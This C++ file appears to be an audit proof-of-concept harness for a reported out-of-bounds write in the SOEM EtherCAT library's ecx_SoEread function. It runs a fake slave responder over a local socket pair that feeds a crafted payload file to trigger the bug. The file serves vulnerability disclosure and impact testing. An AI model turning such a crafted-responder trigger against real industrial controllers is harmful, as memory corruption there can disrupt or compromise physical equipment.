// Stock (non-sanitized) production-build impact test for finding 05 (ecx_SoEread negative
// framedatasize OOB write). Same responder pattern as prodtest-coe.cc/prodtest-mbxreceive.cc.
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <thread>
#include <sys/socket.h>
#include <unistd.h>

extern "C" {
#include "soem/soem.h"
#include "nicdrv.h"
}

#ifndef ETH_P_ECAT
#define ETH_P_ECAT 0x88A4
#endif

namespace {
constexpr uint16_t kSlave = 1;
constexpr uint16_t kConfigAdr = 0x1001;
ecx_contextt g_context;
int g_sv[2];
uint8_t g_payload[64];
size_t g_payload_len;

uint16_t rd16(const uint8_t *p) { return static_cast<uint16_t>(p[0] | (p[1] << 8)); }
void wr16(uint8_t *p, uint16_t v) { p[0] = v & 0xff; p[1] = (v >> 8) & 0xff; }

void respond(int idx_byte, uint16_t requested_dlength, const uint8_t *payload, uint16_t payload_len) {
    uint8_t frame[ETH_HEADERSIZE + EC_HEADERSIZE + 1518];
    ec_setupheader(frame);
    uint8_t *dg = frame + ETH_HEADERSIZE;
    wr16(dg + 0, EC_ECATTYPE + EC_HEADERSIZE + requested_dlength);
    dg[2] = 0;
    dg[3] = static_cast<uint8_t>(idx_byte);
    wr16(dg + 4, kConfigAdr);
    wr16(dg + 6, 0);
    wr16(dg + 8, requested_dlength);
    wr16(dg + 10, 0);
    uint16_t n = payload_len < requested_dlength ? payload_len : requested_dlength;
    if (n > 0) memcpy(dg + EC_HEADERSIZE, payload, n);
    if (n < requested_dlength) memset(dg + EC_HEADERSIZE + n, 0, requested_dlength - n);
    wr16(dg + EC_HEADERSIZE + requested_dlength, 1);
    write(g_sv[1], frame, ETH_HEADERSIZE + EC_HEADERSIZE + requested_dlength + EC_WKCSIZE);
}

void responder_loop() {
    uint8_t buf[EC_BUFSIZE];
    while (true) {
        ssize_t n = recv(g_sv[1], buf, sizeof(buf), 0);
        if (n <= 0) continue;
        if (static_cast<size_t>(n) < ETH_HEADERSIZE + EC_HEADERSIZE) continue;
        if (buf[12] != 0x88 || buf[13] != 0xA4) continue;
        const uint8_t *dg = buf + ETH_HEADERSIZE;
        uint8_t command = dg[2];
        uint8_t idx_byte = dg[3];
        uint16_t dlength = rd16(dg + 8);
        if (command == EC_CMD_FPWR) {
            respond(idx_byte, dlength, nullptr, 0);
        } else if (command == EC_CMD_FPRD) {
            if (dlength <= 4) {
                uint8_t s = 0x08;
                respond(idx_byte, dlength, &s, 1);
            } else {
                respond(idx_byte, dlength, g_payload, static_cast<uint16_t>(g_payload_len));
            }
        }
    }
}
} // namespace

int main(int argc, char **argv) {
    if (argc != 2) { fprintf(stderr, "usage: %s <payload-file>\n", argv[0]); return 2; }
    FILE *f = fopen(argv[1], "rb");
    if (!f) { perror("fopen"); return 2; }
    g_payload_len = fread(g_payload, 1, sizeof(g_payload), f);
    fclose(f);
    fprintf(stderr, "Loaded %zu byte payload\n", g_payload_len);

    memset(&g_context, 0, sizeof(g_context));
    ecx_portt *port = &g_context.port;
    pthread_mutexattr_t ma;
    pthread_mutexattr_init(&ma);
    pthread_mutexattr_setprotocol(&ma, PTHREAD_PRIO_INHERIT);
    pthread_mutex_init(&port->getindex_mutex, &ma);
    pthread_mutex_init(&port->tx_mutex, &ma);
    pthread_mutex_init(&port->rx_mutex, &ma);
    port->stack.sock = &port->sockhandle;
    port->stack.txbuf = &port->txbuf;
    port->stack.txbuflength = &port->txbuflength;
    port->stack.tempbuf = &port->tempinbuf;
    port->stack.rxbuf = &port->rxbuf;
    port->stack.rxbufstat = &port->rxbufstat;
    port->stack.rxsa = &port->rxsa;
    for (int i = 0; i < EC_MAXBUF; i++) ec_setupheader(&port->txbuf[i]);
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, g_sv) != 0) { perror("socketpair"); return 2; }
    port->sockhandle = g_sv[0];
    ecx_initmbxpool(&g_context);
    ec_slavet *sl = &g_context.slavelist[kSlave];
    sl->configadr = kConfigAdr;
    sl->state = EC_STATE_PRE_OP;
    sl->mbxhandlerstate = ECT_MBXH_NONE;
    sl->mbx_l = 64;
    sl->mbx_wo = 0x1000;
    sl->mbx_rl = 64;
    sl->mbx_ro = 0x1100;
    std::thread(responder_loop).detach();

    int psize = 64;
    static uint8_t out[128];
    memset(out, 0, sizeof(out));
    int wkc = ecx_SoEread(&g_context, kSlave, 0, 0x07, 1, &psize, out, 20000);
    fprintf(stderr, "ecx_SoEread returned wkc=%d psize=%d -- no crash\n", wkc, psize);
    return 0;
}
